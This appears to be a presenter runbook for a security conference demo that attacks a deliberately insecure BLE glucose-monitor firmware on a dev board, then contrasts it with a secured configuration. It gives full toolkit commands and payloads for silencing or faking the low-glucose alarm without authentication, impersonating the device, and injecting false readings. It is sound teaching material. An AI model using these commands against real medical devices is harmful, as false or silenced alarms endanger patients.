# DEF CON Demo Labs — GlucoSense BLE Attack Demonstration
## Presentation Instructions (self-contained handoff)

This document is the single source of truth for running the live demo. It
assumes nothing from prior conversations. Everything needed is here.

---

## What This Demo Is

A live BLE security demonstration using entirely our own hardware. No
real medical device is shown. The target is a custom-built firmware on an
nRF52840-DK that deliberately reproduces the class of vulnerabilities found
in real BLE medical devices. The BRAT (BLE Recon and Attack Toolkit) is the
attacker tool. An Android companion app is the victim client.

The narrative arc:
> "This is what no BLE security looks like — and here's exactly what an
> attacker does. Then we flip the config and show what good looks like."

---

## Hardware Inventory

| Role | Device | Adapter index |
|---|---|---|
| **Demo target** | nRF52840-DK (PCA10056) | — (plugged via USB for serial console, not an HCI adapter) |
| **Scanner / passive** | nRF52840 USB dongle (Zephyr HCI USB firmware) | **hci0** |
| **Impersonator / rogue** | TP-Link UB500 (Realtek, `2357:0604`) | **hci1** |
| **Victim client** | Android phone with GlucoSense Viewer app | connected over USB for adb |

**Critical**: hci0 = dongle (scanning), hci1 = UB500 (impersonation/advertising).
These numbers can swap after a replug — always verify with `hciconfig` before
running any command and update the flags if they differ.

**Warning**: two BT adapters in the same host cannot see each other through
BlueZ. Scanning from hci0 will never show hci1's advertisement even when it is
provably on air. This is correct behaviour, not a bug.

---

## File Locations

```
~/demo-target/
├── src/main.c                  — firmware source
├── prj.conf                    — v1 insecure config  (name: GlucoSense-OPEN)
├── prj_secure.conf             — v2 secure config    (name: GlucoSense-SECURE)
├── BUILD_SPEC.md               — build environment reference
└── android/build/out/
    └── glucosense-viewer.apk   — companion app

~/Desktop/Medical/mira/brat/
├── profiles/glucosense_open.yaml   — BRAT profile for v1
└── venv/                           — Python venv (activate before running brat)
```

---

## Pre-Flight Checklist (do this before the audience arrives)

### 1. Build the firmware (if not already done)

```bash
cd ~/ncs && source .venv/bin/activate && export ZEPHYR_BASE=~/ncs/zephyr
cd ~/demo-target

# v1 — insecure
west build -b nrf52840dk/nrf52840 -d /tmp/build_v1
# v2 — secure
west build -b nrf52840dk/nrf52840 -d /tmp/build_v2 -- -DCONF_FILE=prj_secure.conf
```

If the build fails with a toolchain error, the Zephyr SDK is at
`~/zephyr-sdk-1.0.1/gnu/arm-zephyr-eabi/bin/`. The `nrfutil toolchain-manager`
command does not exist on this aarch64 machine — that is expected.

### 2. Flash v1 to the DK

```bash
west flash -d /tmp/build_v1 --no-rebuild
```

Verify: `sudo timeout 12 cat /dev/ttyACM0` — should show a boot banner with
`I: Glucose drift started`, not an MPU FAULT. Press `Ctrl-C` when done.

Board LED3 will blink once per second (heartbeat). LED1 will come on when
glucose drifts below 70 mg/dL (~3 minutes from boot at the demo drift rate).

### 3. Confirm adapters

Plug in the dongle and the UB500. Run:

```bash
sudo hciconfig -a
```

Note which index is which. Dongle = the one showing address `DE:AD:BE:EF:CA:FE`
(set by `flash_hci.sh`). UB500 = the other one.

If the dongle shows `00:00:00:00:00:00` or is not UP:

```bash
# Fix dongle address (run after every replug):
sudo hcitool -i hci0 cmd 0x08 0x0005 FE CA EF BE AD DE
sudo hciconfig hci0 up
```

### 4. Install the companion app on the Android phone

```bash
adb install -r ~/demo-target/android/build/out/glucosense-viewer.apk
```

Open it once to grant BLE permissions. Confirm it shows "Scanning..." and
finds `GlucoSense-OPEN`.

### 5. Activate the BRAT venv

```bash
cd ~/Desktop/Medical/mira/brat
source venv/bin/activate
```

All `brat` commands below assume this venv is active.

---

## Demo Flow — Step by Step

Each step shows: the command to run, what appears on screen, and what to
say to the audience.

---

### Step 0 — Context slide (no command)

> "We have a fictional glucose monitor — the GlucoSense-7A21. It's on this
> board. Our Android app is connected to it, showing a live reading. Now let's
> see what an attacker with a laptop and a $10 dongle can do."

Point at the phone: glucose value displayed, state banner green "In range".

---

### Step 1 — Doctor (environment check)

```bash
sudo python3 -m brat doctor --adapter hci0
```

**What to say**: "First the toolkit checks its environment — can it see the BT
stack, is the adapter up, does it have permission to use it."

Expected output: all green checks. If anything is red, fix it before
continuing (see Gotchas section).

---

### Step 2 — Scan (find the target)

```bash
sudo python3 -m brat scan --adapter hci0 --timeout 8
```

**What to say**: "Passive scan — just listening to advertisements. No
connection, no interaction. The toolkit fingerprints what it sees."

**Audience sees**:
- Table with `GlucoSense-OPEN` listed
- Address type: `random-static` → MEDIUM finding (trackable, no rotating
  address)
- Profile match: `glucosense_open +proto` (toolkit already knows this device)
- Flagged service: Glucose (0x1808) — MEDIUM, sensitive data advertised

---

### Step 3 — Posture check on v1 (the dramatic one)

```bash
sudo python3 -m brat posture --profile glucosense_open --adapter hci0
```

**What to say**: "Now we connect and inspect every GATT characteristic — can
we read sensitive data without pairing? Can we write to dangerous controls?"

**Audience sees** (stable result: 3 CRITICAL, 3 HIGH, 4 MEDIUM):

| Severity | Finding |
|---|---|
| **CRITICAL** | Glucose Measurement (0x2a18) readable without authentication |
| **CRITICAL** | NUS RX (command channel) writable without authentication |
| **CRITICAL** | DFU reboot characteristic writable without authentication |
| HIGH | No link encryption enforced |
| HIGH | No pairing required |
| HIGH | Protocol channel exposes no authentication |
| MEDIUM | Static trackable address |
| … | … |

**Pause here.** Let the audience read the CRITICAL findings. This is the
visual peak of the attack surface reveal.

---

### Step 4 — Enum (enumerate GATT tree)

```bash
sudo python3 -m brat enum --profile glucosense_open --adapter hci0
```

**What to say**: "Full GATT tree walk. We can see every service, every
characteristic, the DFU service — all of it, without pairing."

No drama needed here; it's supporting evidence for posture.

---

### Step 5 — Drive (rogue central — attack the device itself)

> **This is the strongest single result in the demo.** Everything so far has
> been reconnaissance. This is the first step that *changes the device*, and
> the effect is physical and visible across the room.

**Before running**: let the board sit until glucose drifts below 70 mg/dL —
**LED1 will be lit** (urgent low alarm). That takes about 75 seconds from boot.
Point at the lit LED so the audience sees the starting state.

```bash
sudo python3 -m brat drive --profile glucosense_open --adapter hci0 \
    --address E5:E2:89:A3:8D:F1 \
    --send 30 --send 20:00 --send 30 --wait 1.5 --confirm
```

**What to say while it runs**: "No phone, no app, no pairing. I'm connecting
straight to the device as an unauthorised client. I ask its status, I tell it
to silence the alarm, I ask its status again."

**Audience sees** — the terminal prints a proven state change:

```
STATE CHANGE PROVEN
  probe:      0x30 (STATUS)
  before:     0028 01 00 01000001
  after:      0028 00 00 01000001
    byte 2:   01 -> 00
  caused by:  0x20 (ALARM_SET)

CRITICAL  An unauthenticated command changed device state
```

**And LED1 on the board goes out.**

Now decode the payload out loud — this is the whole talk in one line:

| | glucose | alarm | authenticated |
|---|---|---|---|
| before | `0028` = **40 mg/dL** | `01` = **ON** | `00` = **no** |
| after | `0028` = **40 mg/dL** | `00` = **OFF** | `00` = **no** |

> "The glucose reading did not change. It is still 40 milligrams per decilitre —
> that is a medical emergency. The only thing that changed is that the alarm is
> now off. And look at the third field: the device's own status says
> `authenticated: no`. It knows I never authenticated. It did it anyway."

**Why this matters more than a spoofed phone display**: BRAT did not have to
know what any of these commands mean. It sent a read, a write, and the same
read again, and the device's own reply proved the write took effect. That
inference works against any framed protocol.

**Optional — the reverse, if time allows.** Fabricating an emergency is as easy
as silencing one:

```bash
sudo python3 -m brat drive --profile glucosense_open --adapter hci0 \
    --address E5:E2:89:A3:8D:F1 \
    --send 30 --send 20:01 --send 30 --wait 1.5 --confirm
```

LED1 comes back on. Same finding, `byte 2: 00 -> 01`.

---

### Step 6 — Protocol infer (decode the wire protocol)

> This requires a live session log with all 5 commands. Run the app first:
> let it connect to the real device and do a few STATUS polls. The session
> log is at `~/demo-target/session.json` (collected by `brat impersonate` or
> from a phone session).

```bash
sudo python3 -m brat protocol-infer --profile glucosense_open \
    --session ~/demo-target/session.json
```

**What to say**: "We captured a session. The toolkit infers the wire protocol
from first principles — no vendor docs needed."

Expected: fields identified as start/dir/dst/src/cmd/length/payload/crc/end,
CRC-16/MODBUS detected.

---

### Step 7 — Clone (copy the identity)

```bash
sudo python3 -m brat clone --adapter hci0 --name GlucoSense-OPEN
```

**What to say**: "We copy the device's identity — name, services, GATT values
— into a local profile. This is the blueprint for the rogue device."

Output: confirms profile written (or we use the existing `glucosense_open.yaml`
which was already cloned from this device).

---

### Step 8 — Impersonate (stand up the rogue peripheral)

**Before running**: force-stop the GlucoSense app on the phone (swipe it away
in the app switcher). The real DK board may stay powered.

```bash
sudo python3 -m brat impersonate --profile glucosense_open --adapter hci1 \
    --timeout 30
```

**What to say**: "We stand up a rogue device — same name, same GATT services,
same protocol. We're advertising on the TP-Link USB dongle."

Now open the GlucoSense app on the phone. Because BLE has no authentication
of the peripheral's identity, the app connects to the rogue.

**Audience sees**: the impersonate terminal prints `Central connected: <phone MAC>`.

**Say**: "The phone just connected to our laptop. It has no idea. This is a
man-in-the-middle foundation."

---

### Step 9 — Inject (falsify glucose reading)

> This is the climax. The phone is already connected to the rogue from Step 8.
> Open a second terminal and run inject while impersonate is still running.

```bash
sudo python3 -m brat inject --profile glucosense_open --adapter hci1 \
    --cmd 0x30 --payload "0028010101000001"
```

**Payload breakdown** (say this out loud while typing):
- `0028` = 40 mg/dL (big-endian u16) — dangerously low, below alarm threshold
- `01` = alarm active flag
- `01` = authenticated flag
- `01 00 00 01` = firmware version

**What to say**: "We're telling the app the glucose is 40 mg/dL and alarm is
active. The app has never spoken to the real sensor."

**Audience sees** on the phone: large red banner **"URGENT LOW"**, value
drops to **40 mg/dL**. LED1 on the real DK is off (real reading above 70) —
the rogue is contradicting the real device.

**Pause**. Let that land.

> "A patient's phone is showing a critical glucose alert for a reading that
> does not exist. An attacker on the same coffee shop WiFi just silently
> changed a medical alarm."

---

### Step 10 — Contrast with v2 (the fix)

Stop everything. Flash v2 to the DK:

```bash
west flash -d /tmp/build_v2 --no-rebuild
```

The board reboots and advertises as `GlucoSense-SECURE`.

**Run posture against v2**:

```bash
sudo python3 -m brat posture --profile glucosense_open --adapter hci0 \
    --address <v2-MAC>
```

(Scan first to get the MAC: `sudo python3 -m brat scan --adapter hci0 --timeout 6`)

**Audience sees**: 0 CRITICAL, 0 HIGH. Verdict: green. Every read attempt
returns `Insufficient Authentication`. The DFU write returns `Insufficient
Encryption`.

**Then try the same rogue-central attack that worked in Step 5**:

```bash
sudo python3 -m brat drive --profile glucosense_open --adapter hci0 \
    --address <v2-MAC> --send 30 --send 20:00 --send 30 --wait 1.5 --confirm
```

**Audience sees**: every write refused at the ATT layer, and an INFO finding
instead of a CRITICAL:

```
INFO  Device refused protocol commands from an unauthenticated peer
      protocol.commands-refused
```

**And LED1 stays lit.** The alarm cannot be silenced by anyone who has not
bonded with a passkey.

> "Same command. Same tool. Same three frames. The device now says no."

**Then try impersonation against v2**:

```bash
sudo python3 -m brat impersonate --profile glucosense_open --adapter hci1 \
    --timeout 20
```

Open the app. It tries to connect to `GlucoSense-SECURE`. Because the app
has a bond to the real device, the rogue cannot complete encryption — the
passkey exchange fails. The app shows the failure screen ("Authentication
failed").

**Say**: "Same attack. One config change. The difference is six Kconfig lines."

Show the diff:

```bash
diff ~/demo-target/prj.conf ~/demo-target/prj_secure.conf
```

The key additions in v2:
```
CONFIG_BT_SMP=y
CONFIG_BT_BONDABLE=y
CONFIG_BT_BONDING_REQUIRED=y
CONFIG_BT_SMP_ENFORCE_MITM=y
CONFIG_BT_FIXED_PASSKEY=y
```

---

## Quick Reference — All Commands

```bash
# Environment check
sudo python3 -m brat doctor --adapter hci0

# Find target
sudo python3 -m brat scan --adapter hci0 --timeout 8

# Security posture (v1 = lots of findings, v2 = clean)
sudo python3 -m brat posture --profile glucosense_open --adapter hci0

# Full GATT tree
sudo python3 -m brat enum --profile glucosense_open --adapter hci0

# Rogue central — drive the REAL device (silences the alarm, LED1 goes out)
sudo python3 -m brat drive --profile glucosense_open --adapter hci0 \
    --address E5:E2:89:A3:8D:F1 --send 30 --send 20:00 --send 30 --wait 1.5 --confirm

# ...and the reverse: fabricate an alarm (LED1 comes on)
sudo python3 -m brat drive --profile glucosense_open --adapter hci0 \
    --address E5:E2:89:A3:8D:F1 --send 30 --send 20:01 --send 30 --wait 1.5 --confirm

# Clone identity
sudo python3 -m brat clone --adapter hci0 --name GlucoSense-OPEN

# Rogue peripheral (use hci1 = UB500 for advertising)
sudo python3 -m brat impersonate --profile glucosense_open --adapter hci1 --timeout 30

# Inject false data while impersonate is running (second terminal)
sudo python3 -m brat inject --profile glucosense_open --adapter hci1 \
    --cmd 0x30 --payload "0028010101000001"

# Protocol inference from captured session
sudo python3 -m brat protocol-infer --profile glucosense_open \
    --session ~/demo-target/session.json

# Protocol decode (decode a raw hex frame)
sudo python3 -m brat protocol-decode --profile glucosense_open \
    --frame "7e0000102030000af0cef"
```

---

## Inject Payload Reference

The STATUS command (0x30) payload format (8 bytes):

```
[0:2]  glucose u16be      — 0x006E = 110, 0x0028 = 40, 0x004B = 75
[2]    alarm active       — 0x00 = no alarm, 0x01 = URGENT LOW active
[3]    authenticated      — 0x00 = unauthenticated, 0x01 = authenticated
[4:8]  firmware version   — 01 00 00 01
```

Useful payloads:

| Payload | Meaning |
|---|---|
| `006E0001 01000001` | 110 mg/dL, alarm off, authenticated (normal) |
| `0028010101000001` | 40 mg/dL, URGENT LOW, authenticated ← **demo payload** |
| `004B0001 01000001` | 75 mg/dL, just above threshold, no alarm |
| `00640000 01000001` | 100 mg/dL, alarm silenced (divergence demo) |

---

## Flashing Reference

```bash
# Activate NCS environment
cd ~/ncs && source .venv/bin/activate && export ZEPHYR_BASE=~/ncs/zephyr
cd ~/demo-target

# Build v1 (first time or after source changes)
west build -b nrf52840dk/nrf52840 -d /tmp/build_v1

# Build v2
west build -b nrf52840dk/nrf52840 -d /tmp/build_v2 -- -DCONF_FILE=prj_secure.conf

# Flash v1
west flash -d /tmp/build_v1 --no-rebuild

# Flash v2
west flash -d /tmp/build_v2 --no-rebuild

# Watch serial console (Ctrl-C to stop)
sudo timeout 30 cat /dev/ttyACM0
```

The DK does **not** need to stay plugged into the laptop during the demo. It
runs standalone from any USB power source. Unplug the data cable after
flashing and use a USB power bank for the demo table.

---

## Gotchas

### Adapter index changed after replug
Run `sudo hciconfig -a`. If hci0 is the UB500 and hci1 is the dongle, swap
all `--adapter` flags accordingly.

### Dongle shows `00:00:00:00:00:00`
Run after every replug:
```bash
sudo hcitool -i hci0 cmd 0x08 0x0005 FE CA EF BE AD DE
sudo hciconfig hci0 up
```

### BlueZ wedged (`hciconfig` returns "No such device" or `btmgmt` hangs)
```bash
sudo systemctl restart bluetooth && sleep 3
```

### App says "NUS service not found" after profile changes
The Android GATT cache is stale. The app calls `refreshDeviceCache()` on
connect with a 600ms delay — if it still fails, force-stop the app, wait 5s,
and reconnect.

### App can't find the device at all
- Confirm the impersonator is advertising: `sudo btmon --index 1 | grep -i adv`
- Confirm the app filters on names containing "Gluco" — if you test with a
  renamed profile, the app won't see it
- Force-stop the app, restart it

### Impersonate reports "nothing happened" (no connection seen)
- Confirm phone's GlucoSense app is force-stopped before running impersonate
- Confirm the impersonator adapter (hci1) is UP: `sudo hciconfig hci1 up`
- If the phone has a bond to the real device and you're impersonating v2, the
  bond mismatch is expected and correct — that's the v2 demo outcome

### Two stale brat processes competing
If a previous impersonate/inject session was not cleanly stopped, BlueZ may
block a new one. Check: `pgrep -a python3 | grep brat`. Kill stray processes
with `sudo kill <pid>`, then restart bluetooth.

### Inject shows 110 instead of 40 on phone
The profile's STATUS rule and the injection rule both answered. This was fixed:
`install_injection_rule()` removes the profile rule for the same `on_cmd`.
If you see this, check that you have the latest BRAT (test suite: 284 passed).

### v2 posture shows a stray CRITICAL finding
Two causes were fixed: (a) `Client Supported Features` (0x2b29) is now
excluded from write-exposure checks, and (b) `DISCONNECTED` from pairing
refusal now counts as enforcement evidence. v2 should be 0 CRITICAL / 0 HIGH.
If you see a CRITICAL, run posture a second time — if it disappears, it was a
timing artefact.

### Board in reset loop (LED flashing fast, no console banner)
This is `CONFIG_LOG_MODE_IMMEDIATE` overflow. It means the firmware was built
with that option on — it must not be set. Check `prj.conf` — if you see
`CONFIG_LOG_MODE_IMMEDIATE=y`, remove it and rebuild.

---

## The Key Message (one slide)

> **The attack (Steps 1-9) took 5 minutes. The fix (prj_secure.conf diff) is
> 5 Kconfig lines. The gap between "nothing" and "good enough" is smaller
> than anyone thinks.**

That is the talk. Everything else is evidence.
